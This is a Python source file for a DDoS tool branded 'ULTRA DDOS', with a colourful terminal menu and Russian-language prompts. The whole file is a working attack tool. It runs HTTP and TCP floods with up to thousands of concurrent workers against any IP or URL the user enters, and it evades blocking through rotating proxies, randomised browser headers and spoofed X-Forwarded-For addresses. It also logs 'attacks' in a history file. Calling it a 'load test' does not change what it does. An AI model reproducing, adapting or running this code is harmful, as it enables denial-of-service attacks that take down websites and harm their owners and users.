import os
import sys
import time
import random
import json
import asyncio
import aiohttp
import socket
import logging
from datetime import datetime

# ================= LOGGER (лог в папку со скриптом) =================
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, "load_test.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= WINDOWS CONSOLE FIXES =================
if os.name == "nt":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    try:
        os.system("")
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        try:
            import colorama
            colorama.init()
        except ImportError:
            pass

# ================= ЦВЕТА =================
RESET = "\033[0m"

def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

PINK = rgb(255, 30, 220)
PINK_MID = rgb(200, 20, 180)
WHITE = rgb(255, 255, 255)

# ================= БАННЕР =================
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""
{PINK}ULTRA DDOS

{PINK_MID}v5.0 Pydroid {PINK_MID}|{PINK} by @jecrs {PINK_MID}|{PINK} verificator
{PINK}Open Source Intelligence Tool
{RESET}
""")

# ================= КОНФИГ =================
CONFIG = {
    "max_threads": 1000,
    "timeout": 3,
    "max_duration": 0,
    "save_results": True,
    "check_private_ip": False,
    "proxy_rotation_interval": 10,
    "socks5_support": True
}

# ================= СТАТИСТИКА =================
def load_total_stats():
    try:
        with open('total_stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"total_attacks": 0, "total_requests": 0, "total_success": 0, "total_errors": 0}

def save_total_stats(stats):
    try:
        with open('total_stats.json', 'w') as f:
            json.dump(stats, f, indent=4)
    except:
        pass

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            hist = json.load(f)
    except:
        hist = []
    hist.append(entry)
    if len(hist) > 100:
        hist = hist[-100:]
    try:
        with open('history.json', 'w') as f:
            json.dump(hist, f, indent=4)
    except:
        pass

def load_history():
    try:
        with open('history.json', 'r') as f:
            return json.load(f)
    except:
        return []

# ================= ПРОВЕРКА ПРОКСИ =================
async def check_proxy(proxy):
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip', proxy=proxy) as resp:
                return resp.status == 200
    except:
        return False

# ================= АСИНХРОННЫЙ TCP =================
async def tcp_flood_async(ip, port):
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        for _ in range(5):
            writer.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            await writer.drain()
        writer.close()
        await writer.wait_closed()
        return True
    except:
        return False

# ================= БЕЗОПАСНЫЙ ВВОД =================
def safe_input_int(prompt, default=100, min_val=1, max_val=1000):
    while True:
        user_input = input(prompt)
        if user_input == "":
            return default
        try:
            val = int(user_input)
            if min_val <= val <= max_val:
                return val
            else:
                logger.warning(f"[!] Введите число от {min_val} до {max_val}")
        except ValueError:
            logger.warning("[!] Ошибка: введите целое число")

# ================= КЛАСС НАГРУЗКИ =================
class LoadTester:
    def __init__(self):
        self.running = False
        self.requests = 0
        self.success = 0
        self.errors = 0
        self.banned = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.session = None
        self.proxies = []
        self.current_proxy_index = 0
        self._lock = asyncio.Lock()

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            return len(self.proxies)
        except:
            return 0

    def get_next_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy

    async def http_test(self, url):
        try:
            if self.session is None or self.session.closed:
                connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=60)
                timeout = aiohttp.ClientTimeout(total=CONFIG["timeout"])
                self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

            proxy = self.get_next_proxy() if self.proxies else None

            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36'
                ]),
                'Accept': random.choice([
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'application/json,text/plain,*/*',
                    '*/*'
                ]),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': random.choice([
                    'en-US,en;q=0.9',
                    'ru-RU,ru;q=0.8,en-US;q=0.6',
                    'uk-UA,uk;q=0.9,en;q=0.8'
                ]),
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': random.choice(['document', 'empty']),
                'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
                'Sec-Fetch-Site': 'none',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if self.banned > 0 and self.banned % CONFIG["proxy_rotation_interval"] == 0:
                self.current_proxy_index = random.randint(0, len(self.proxies) - 1) if self.proxies else 0
                await asyncio.sleep(0.5)

            async with self.session.get(url, headers=headers, proxy=proxy, ssl=False, allow_redirects=True) as resp:
                body = await resp.read()
                async with self._lock:
                    self.requests += 1
                    self.bytes_sent += len(body)
                    if resp.status in [200, 301, 302, 303, 307, 404]:
                        self.success += 1
                    elif resp.status in [403, 429, 503, 504]:
                        self.banned += 1
                        self.errors += 1
                    else:
                        self.errors += 1
        except:
            async with self._lock:
                self.requests += 1
                self.errors += 1

    async def start_http(self, url, threads):
        self.running = True
        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
        self.start_time = time.time()
        self.load_proxies()

        semaphore = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with semaphore:
                    await self.http_test(url)
                    await asyncio.sleep(random.uniform(0.0005, 0.005))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    async def start_tcp(self, target, threads):
        try:
            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            port = 443 if target.startswith('https://') else 80
        except:
            return

        self.running = True
        self.requests = self.success = self.errors = self.banned = 0
        self.start_time = time.time()
        self.load_proxies()

        semaphore = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with semaphore:
                    if await tcp_flood_async(ip, port):
                        async with self._lock:
                            self.requests += 1
                            self.success += 1
                    else:
                        async with self._lock:
                            self.requests += 1
                            self.errors += 1
                    await asyncio.sleep(random.uniform(0.001, 0.01))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        self.running = False
        if self.session:
            asyncio.create_task(self.session.close())

# ================= ФУНКЦИИ МЕНЮ =================
def show_info():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"""
{PINK}ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ

{WHITE}1.{PINK} DDOS IP ADDRESS
     Запускает HTTP/HTTPS флуд по указанному IP-адресу.

{WHITE}2.{PINK} VIEW URL IP ADDRESS
     Запускает TCP-флуд по указанному URL.

{WHITE}3.{PINK} DDOS SITE LOGS
     Показывает логи всех проведённых атак.

{WHITE}4.{PINK} PROXY MANAGEMENT
     Добавление, удаление и проверка прокси-серверов.

{WHITE}5.{PINK} TOTAL STATISTICS
     Общая статистика по всем атакам.

{WHITE}6.{PINK} HISTORY
     История последних 100 атак.

{WHITE}7.{PINK} SETTINGS
     Настройка потоков, таймаута и ротации прокси.

{WHITE}8.{PINK} INFO
     Показать это руководство.

{WHITE}99.{PINK} EXIT
     Выход из программы.
{RESET}""")
    input(f"{PINK}Нажми ENTER для возврата в меню...{RESET}")

def ddos_ip():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}DDOS IP ADDRESS")
    print(f"{PINK}Type: HTTP/HTTPS Flood{RESET}")

    url = input(f"{PINK}[target] Target IP: {WHITE}")
    if not url.startswith('http'):
        url = 'http://' + url

    threads = safe_input_int(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}", default=100, max_val=CONFIG['max_threads'])

    logger.info(f"[target] Запуск HTTP-атаки на {url} с {threads} потоками")
    asyncio.run(run_http_test(url, threads))

def view_url_ip():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}VIEW URL IP ADDRESS")
    print(f"{PINK}Type: TCP Flood{RESET}")

    url = input(f"{PINK}[target] Target URL: {WHITE}")
    if not url.startswith('http'):
        url = 'http://' + url

    threads = safe_input_int(f"{PINK}Threads (1-{CONFIG['max_threads']}): {WHITE}", default=100, max_val=CONFIG['max_threads'])

    logger.info(f"[target] Запуск TCP-атаки на {url} с {threads} потоками")
    asyncio.run(run_tcp_test(url, threads))

def ddos_site_logs():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}DDOS SITE LOGS{RESET}")

    stats = load_total_stats()
    print(f"{PINK}Total Attacks: {WHITE}{stats['total_attacks']}")
    print(f"{PINK}Total Requests: {WHITE}{stats['total_requests']:,}")
    print(f"{PINK}Total Success: {WHITE}{stats['total_success']:,}")
    print(f"{PINK}Total Errors: {WHITE}{stats['total_errors']:,}")

    input(f"\n{PINK}Press ENTER to return...{RESET}")

# ================= ЗАПУСК ТЕСТОВ =================
async def run_http_test(url, threads):
    tester = LoadTester()
    task = asyncio.create_task(tester.start_http(url, threads))

    while tester.running:
        elapsed = int(time.time() - tester.start_time)
        rate = int(tester.requests / elapsed) if elapsed > 0 else 0
        load = min(100, int(rate / 15))
        bar = '█' * (load // 2) + '░' * (50 - load // 2)

        os.system("cls" if os.name == "nt" else "clear")
        banner()
        print(f"{PINK}ATTACK IN PROGRESS")
        print(f"{PINK}[target] : {WHITE}{url[:30]}")
        print(f"{PINK}Threads : {WHITE}{threads}")
        print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
        print(f"{PINK}Rate    : {WHITE}{rate:,} req/s")
        print(f"{PINK}Success : {WHITE}{tester.success:,}")
        print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
        print(f"{PINK}Blocked : {WHITE}{tester.banned}")
        print(f"{PINK}Load    : {WHITE}[{bar}] {load}%")
        print(f"{PINK}Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}")
        print(f"{PINK}Data    : {WHITE}{tester.bytes_sent/1024/1024:.1f} MB")
        print(f"{PINK}[Press ENTER to stop]{RESET}")
        await asyncio.sleep(0.3)

    tester.stop()
    await task

    elapsed = int(time.time() - tester.start_time)
    entry = {
        "target": url,
        "threads": threads,
        "duration": elapsed,
        "requests": tester.requests,
        "success": tester.success,
        "errors": tester.errors,
        "banned": tester.banned,
        "bytes_sent": tester.bytes_sent,
        "avg_rate": int(tester.requests / elapsed) if elapsed > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }
    save_history(entry)

    stats = load_total_stats()
    stats["total_attacks"] += 1
    stats["total_requests"] += tester.requests
    stats["total_success"] += tester.success
    stats["total_errors"] += tester.errors
    save_total_stats(stats)

    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}ATTACK FINISHED")
    print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
    print(f"{PINK}Success : {WHITE}{tester.success:,}")
    print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
    print(f"{PINK}Blocked : {WHITE}{tester.banned}")
    print(f"{PINK}Duration: {WHITE}{elapsed} sec")
    print(f"{PINK}Avg Rate: {WHITE}{int(tester.requests / elapsed) if elapsed > 0 else 0} req/s{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

async def run_tcp_test(url, threads):
    tester = LoadTester()
    task = asyncio.create_task(tester.start_tcp(url, threads))

    while tester.running:
        elapsed = int(time.time() - tester.start_time)
        rate = int(tester.requests / elapsed) if elapsed > 0 else 0
        load = min(100, int(rate / 15))
        bar = '█' * (load // 2) + '░' * (50 - load // 2)

        os.system("cls" if os.name == "nt" else "clear")
        banner()
        print(f"{PINK}ATTACK IN PROGRESS")
        print(f"{PINK}[target] : {WHITE}{url[:30]}")
        print(f"{PINK}Threads : {WHITE}{threads}")
        print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
        print(f"{PINK}Rate    : {WHITE}{rate:,} req/s")
        print(f"{PINK}Success : {WHITE}{tester.success:,}")
        print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
        print(f"{PINK}Blocked : {WHITE}{tester.banned}")
        print(f"{PINK}Load    : {WHITE}[{bar}] {load}%")
        print(f"{PINK}Time    : {WHITE}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}")
        print(f"{PINK}Data    : {WHITE}{tester.bytes_sent/1024/1024:.1f} MB")
        print(f"{PINK}[Press ENTER to stop]{RESET}")
        await asyncio.sleep(0.3)

    tester.stop()
    await task

    elapsed = int(time.time() - tester.start_time)
    entry = {
        "target": url,
        "threads": threads,
        "duration": elapsed,
        "requests": tester.requests,
        "success": tester.success,
        "errors": tester.errors,
        "banned": tester.banned,
        "bytes_sent": tester.bytes_sent,
        "avg_rate": int(tester.requests / elapsed) if elapsed > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }
    save_history(entry)

    stats = load_total_stats()
    stats["total_attacks"] += 1
    stats["total_requests"] += tester.requests
    stats["total_success"] += tester.success
    stats["total_errors"] += tester.errors
    save_total_stats(stats)

    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}ATTACK FINISHED")
    print(f"{PINK}Requests: {WHITE}{tester.requests:,}")
    print(f"{PINK}Success : {WHITE}{tester.success:,}")
    print(f"{PINK}Errors  : {WHITE}{tester.errors:,}")
    print(f"{PINK}Blocked : {WHITE}{tester.banned}")
    print(f"{PINK}Duration: {WHITE}{elapsed} sec")
    print(f"{PINK}Avg Rate: {WHITE}{int(tester.requests / elapsed) if elapsed > 0 else 0} req/s{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

# ================= PROXY MANAGEMENT =================
def proxy_management():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except:
        proxies = []

    print(f"{PINK}PROXY MANAGEMENT")
    print(f"{PINK}[1] Add proxy manually")
    print(f"{PINK}[2] Load from proxies.txt")
    print(f"{PINK}[3] Show list ({len(proxies)} proxies)")
    print(f"{PINK}[4] Clear list")
    print(f"{PINK}[5] Check all proxies")
    print(f"{PINK}[99] Back{RESET}")

    choice = input(f"{PINK}Select: {WHITE}")
    if choice == '1':
        proxy = input(f"{PINK}Enter proxy (http://ip:port or socks5://ip:port): {WHITE}")
        if proxy:
            with open('proxies.txt', 'a') as f:
                f.write(proxy + '\n')
            logger.info("[OK] Прокси добавлен")
            time.sleep(1)
    elif choice == '2':
        try:
            with open('proxies.txt', 'r') as f:
                count = len([line for line in f if line.strip()])
            logger.info(f"[OK] Загружено {count} прокси")
            time.sleep(1)
        except:
            logger.warning("[!] Файл не найден")
            time.sleep(1)
    elif choice == '3':
        if proxies:
            print(f"\n{PINK}List:{RESET}")
            for i, p in enumerate(proxies, 1):
                print(f"{PINK}{i}. {WHITE}{p}{RESET}")
        else:
            print(f"\n{PINK}[!] Пусто{RESET}")
        input(f"{PINK}Press ENTER...{RESET}")
    elif choice == '4':
        open('proxies.txt', 'w').close()
        logger.info("[OK] Список очищен")
        time.sleep(1)
    elif choice == '5':
        logger.info("[!] Проверка прокси...")
        async def check_all():
            valid = []
            for p in proxies:
                if await check_proxy(p):
                    valid.append(p)
            return valid
        if proxies:
            valid = asyncio.run(check_all())
            with open('proxies.txt', 'w') as f:
                f.write('\n'.join(valid))
            logger.info(f"[OK] Работает: {len(valid)}/{len(proxies)}")
            time.sleep(2)
    elif choice == '99':
        return
    proxy_management()

# ================= TOTAL STATISTICS =================
def total_statistics():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    stats = load_total_stats()
    print(f"{PINK}TOTAL STATISTICS")
    print(f"{PINK}(stats) Tests  : {WHITE}{stats['total_attacks']}")
    print(f"{PINK}(stats) Requests: {WHITE}{stats['total_requests']:,}")
    print(f"{PINK}(stats) Success : {WHITE}{stats['total_success']:,}")
    print(f"{PINK}(stats) Errors  : {WHITE}{stats['total_errors']:,}{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

# ================= HISTORY =================
def history_view():
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    hist = load_history()
    print(f"{PINK}HISTORY (last 10){RESET}")
    if not hist:
        print(f"{PINK}No records found{RESET}")
    else:
        for i, entry in enumerate(hist[-10:], 1):
            target = entry.get('target', 'N/A')[:20]
            req = entry.get('requests', 0)
            ts = entry.get('timestamp', '')[:16]
            print(f"{PINK}{i}. {WHITE}{target}  {req} req  {ts}{RESET}")
    input(f"{PINK}Press ENTER to continue...{RESET}")

# ================= SETTINGS =================
def settings_menu():
    global CONFIG
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    print(f"{PINK}SETTINGS")
    print(f"{PINK}[1] Max Threads : {WHITE}{CONFIG['max_threads']}")
    print(f"{PINK}[2] Timeout     : {WHITE}{CONFIG['timeout']}s")
    print(f"{PINK}[3] Max Duration: {WHITE}{CONFIG['max_duration']}s")
    print(f"{PINK}[4] Proxy Rot.  : {WHITE}{CONFIG['proxy_rotation_interval']}")
    print(f"{PINK}[99] Back{RESET}")

    choice = input(f"{PINK}Select: {WHITE}")
    if choice == '1':
        val = safe_input_int(f"{PINK}Max Threads (100-2000): {WHITE}", default=1000, min_val=100, max_val=2000)
        CONFIG['max_threads'] = val
    elif choice == '2':
        while True:
            val = input(f"{PINK}Timeout (0.5-10): {WHITE}")
            try:
                val = float(val)
                if 0.5 <= val <= 10:
                    CONFIG['timeout'] = val
                    break
                else:
                    logger.warning("[!] Введите число от 0.5 до 10")
            except:
                logger.warning("[!] Ошибка: введите число")
    elif choice == '3':
        val = safe_input_int(f"{PINK}Max Duration seconds (0 = no limit): {WHITE}", default=0, min_val=0, max_val=99999)
        CONFIG['max_duration'] = val
    elif choice == '4':
        val = safe_input_int(f"{PINK}Proxy rotation every N requests (5-100): {WHITE}", default=10, min_val=5, max_val=100)
        CONFIG['proxy_rotation_interval'] = val
    elif choice == '99':
        return
    settings_menu()

# ================= MAIN =================
def main():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        banner()
        print(f"""
{PINK}ГЛАВНОЕ МЕНЮ

{WHITE}1.{PINK} DDos Ip Address
{WHITE}2.{PINK} View Url Ip Address
{WHITE}3.{PINK} DDos site logs
{WHITE}4.{PINK} Proxy Management
{WHITE}5.{PINK} Total Statistics
{WHITE}6.{PINK} History
{WHITE}7.{PINK} Settings
{WHITE}8.{PINK} INFO — инструкция по использованию
{WHITE}99.{PINK} Exit
{RESET}""")
        try:
            op = int(input(f"{PINK}Выбери опцию (0-99): {WHITE}"))
        except:
            logger.warning("[!] Неверный ввод")
            time.sleep(1.6)
            continue

        if op == 1:
            ddos_ip()
        elif op == 2:
            view_url_ip()
        elif op == 3:
            ddos_site_logs()
        elif op == 4:
            proxy_management()
        elif op == 5:
            total_statistics()
        elif op == 6:
            history_view()
        elif op == 7:
            settings_menu()
        elif op == 8:
            show_info()
        elif op == 99:
            os.system("cls" if os.name == "nt" else "clear")
            print(f"{PINK}Exiting...{RESET}")
            logger.info("Завершение работы")
            sys.exit()
        else:
            logger.warning("[!] Неверный выбор")
            time.sleep(1.6)

if __name__ == "__main__":
    main()
